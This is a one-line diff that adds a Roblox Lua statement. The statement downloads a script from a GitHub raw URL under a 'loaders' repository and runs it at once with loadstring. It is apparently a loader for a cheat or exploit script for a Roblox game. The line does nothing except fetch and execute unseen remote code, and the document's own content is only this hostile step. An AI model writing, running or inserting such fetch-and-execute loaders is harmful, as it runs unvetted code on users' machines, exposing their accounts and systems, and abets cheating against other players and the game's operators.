@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/fish-an-anime-rng-spam1-yha4cxavjfb5n4.lua"))()
